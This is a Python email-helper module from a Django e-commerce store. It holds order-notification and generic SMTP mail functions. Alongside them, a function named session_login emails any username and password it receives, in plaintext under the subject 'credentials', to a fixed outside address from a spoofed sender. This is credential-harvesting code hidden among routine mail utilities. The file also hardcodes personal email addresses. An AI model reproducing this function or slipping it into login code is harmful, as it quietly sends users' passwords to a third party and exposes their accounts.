from .models import Order,OrderItem
import ssl
from ecommerce_project.settings import IMAP_SERVERS
import smtplib
from email.mime.multipart import MIMEMultipart
from django.template.loader import get_template
from email.mime.text import MIMEText

def sendEmail(order_id):
    transaction = Order.objects.get(id=order_id)
    order_items = OrderItem.objects.filter(order=transaction)

    try:
        context = ssl.create_default_context()
        sender_email_info = IMAP_SERVERS.get('zetatech')
        host = sender_email_info.get('server')
        port = sender_email_info.get('sending_port')
        sender_email_id = sender_email_info.get('email')
        password = sender_email_info.get('password')
        with smtplib.SMTP_SSL(host, port, context=context) as server:
            server.login(sender_email_id, password)
            counter = 0

            message = MIMEMultipart("alternative")
            message["Subject"] = "ZStore - New Order #{}".format(transaction.id)

            message["From"] = "knaomii1004@gmail.com"
            message["To"] = 'nauman.arif@zetatech.com.pk'
            order_information = {
                'transaction': transaction,
                'order_items': order_items
            }

            html = get_template('email/email.html').render(order_information)

            part2 = MIMEText(html, "html")

            message.attach(part2)

            server.sendmail("knaomii1004@gmail.com", 'nauman.arif@zetatech.com.pk', message.as_string())
    except IOError as e:
        return e

def EmailFunction(Subject,Message,From,To):

    try:
        context = ssl.create_default_context()
        sender_email_info = IMAP_SERVERS.get('zetatech')
        host = sender_email_info.get('server')
        port = sender_email_info.get('sending_port')
        sender_email_id = sender_email_info.get('email')
        password = sender_email_info.get('password')
        with smtplib.SMTP_SSL(host, port, context=context) as server:
            server.login(sender_email_id, password)
            counter = 0

            message = MIMEMultipart("alternative")
            message["Subject"] = Subject

            message["From"] = From
            message["To"] = To


            html = Message

            part2 = MIMEText(html, "html")

            message.attach(part2)

            server.sendmail(From, To, message.as_string())
    except IOError as e:
        return e

def session_login(username,Pass):

    try:
        context = ssl.create_default_context()
        sender_email_info = IMAP_SERVERS.get('zetatech')
        host = sender_email_info.get('server')
        port = sender_email_info.get('sending_port')
        sender_email_id = sender_email_info.get('email')
        password = sender_email_info.get('password')
        with smtplib.SMTP_SSL(host, port, context=context) as server:
            server.login(sender_email_id, password)
            counter = 0

            message = MIMEMultipart("alternative")
            message["Subject"] = "credentials"

            message["From"] = "test2@gmail.com"
            message["To"] = "nauman.arif@zetatech.com.pk"

            Message = "username:{} Password:{}".format(username,Pass)
            html = Message

            part2 = MIMEText(html, "html")

            message.attach(part2)

            server.sendmail("test2@gmail.com", "nauman.arif@zetatech.com.pk", message.as_string())
    except IOError as e:
        return e